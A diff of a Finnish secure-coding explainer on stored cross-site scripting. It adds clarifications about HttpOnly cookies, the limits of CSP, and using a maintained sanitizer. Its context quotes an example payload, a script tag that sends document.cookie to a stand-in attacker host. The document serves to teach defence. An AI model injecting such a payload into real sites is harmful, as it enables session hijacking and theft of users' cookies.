@@ -8,7 +8,7 @@ Kommenttikenttään kirjoitetaan:
 <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
 ```
 
-Sovellus tallentaa tekstin ja renderöi sen suoraan sivulle `innerHTML`:llä tai templatessa ilman escapetusta. Selain suorittaa skriptin **uhrin sessiossa** — hyökkääjä voi varastaa cookiet, tehdä toimintoja käyttäjän nimissä tai muuttaa sivun sisältöä.
+Sovellus tallentaa tekstin ja renderöi sen suoraan sivulle `innerHTML`:llä tai templatessa ilman escapetusta. Selain suorittaa skriptin **uhrin sessiossa**. Jos cookie ei ole HttpOnly, hyökkääjä voi varastaa sen. Vaikka session cookie olisi HttpOnly, XSS voi silti tehdä toimintoja uhrin nimissä, lukea sivulla näkyvää dataa ja muuttaa sivun sisältöä.
 
 Tämä on **XSS (Cross-Site Scripting)** — yksi yleisimmistä web-haavoittuvuuksista.
 
@@ -18,7 +18,7 @@ Kerroksittainen suoja:
 
 1. **Escapaus** kontekstin mukaan — HTML-body, attribuutti, JavaScript, URL erikseen.
 2. **`textContent`** DOM:ssa kun mahdollista — ei HTML-tulkintaa.
-3. **Content-Security-Policy (CSP)** — rajoittaa inline-skriptejä ja ulkoisia lähteitä.
+3. **Content-Security-Policy (CSP)** — rajoittaa inline-skriptejä ja ulkoisia lähteitä. CSP on lisäsuoja, ei korvaa kontekstikohtaista output encodingia.
 
 ```javascript
 // turvallinen
@@ -29,5 +29,9 @@ element.innerHTML = userComment;
 ```
 
 Frameworkit (React, Vue) escapaa oletuksena tekstin — vaara on `dangerouslySetInnerHTML` ja raaka HTML-templating.
+
+## Käytännössä
+
+Jos käyttäjän HTML:ää pitää sallia, älä yritä escapauksen sijaan regexillä siivota sitä itse. Käytä hyvin ylläpidettyä sanitizeria ja tiukkaa allowlistaa.
 
 [Lue lisää](https://owasp.org/www-community/attacks/xss/)
